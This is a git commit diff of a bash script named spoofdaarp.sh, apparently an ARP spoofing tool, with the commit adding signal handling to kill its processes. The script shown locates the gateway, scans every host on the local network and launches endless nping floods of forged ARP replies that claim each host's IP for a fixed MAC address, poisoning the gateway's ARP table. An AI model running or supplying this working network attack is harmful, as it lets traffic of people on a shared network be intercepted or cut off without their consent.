05509f5b23723c2916c566fda989b489a1be7ec5
Eclipse <0-Eclipse-0@users.noreply.github.com>
2021-10-24 21:52:02 -0400

    Added SIGINT handling

--- spoofdaarp.sh
+++ spoofdaarp.sh
@@ -1,16 +1,26 @@
 #!/bin/bash
-get_gateway_addr () {
+get_gateway_addr () 
+{
 	arp -a | grep -oP '((\bgateway)(\s)((\()((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1})))(\)))' > gateway_expr.txt
 	sed 's/gateway (//' gateway_expr.txt > formatted_1.txt
 	sed 's/)//' formatted_1.txt > gateway.txt
 	rm formatted_1.txt & rm gateway_expr.txt
 }
 
-get_arp_list () {
+get_arp_list () 
+{
 	arp-scan --localnet | grep -oP '(((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1}))[.]((\d{3}|\d{2})|(\d{1})))' > arp_list.txt
 }
 
-start_spoof () {
+on_kill () 
+{
+	pkill -9 -f nping
+	rm gateway.txt & rm arp_list.txt
+	echo "[SpoofDaARP] All ARP Spoof processes killed!"
+}
+
+start_spoof () 
+{
   gateway="$(cat gateway.txt)"
 	echo "[SpoofDaARP] Spoofing in 5 seconds. Run kill.sh to stop all spoofing processes..."
 	sleep 5s
@@ -19,6 +29,8 @@ start_spoof () {
 		nping --arp-type arp-reply --source-mac 80:56:f2:38:3c:0e --source-ip "$ip" -c 0 "$gateway" &
 	done < "arp_list.txt"
 }
+
+trap on_kill SIGHUP SIGINT SIGTERM # Kill nping processes
 
 get_gateway_addr # Call Gateway Addr Function
 get_arp_list # Call Arp List Function
